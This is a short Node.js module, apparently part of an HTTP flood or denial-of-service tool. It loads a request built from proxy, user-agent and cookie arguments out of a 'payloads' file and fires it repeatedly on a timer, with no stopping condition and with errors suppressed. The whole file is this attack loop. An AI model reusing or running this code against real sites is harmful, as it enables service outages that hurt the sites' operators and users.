const request = require('request');


async function tryhttp(obj, args){
    setInterval(() => {
        try{
            request(obj);
        }catch(e){}
    }, args.rate);
}

function start(args, proxy, ua, secondcookies){
    tryhttp(require('./payloads/http.js')(args, proxy, ua, secondcookies), args)
}

module.exports = start;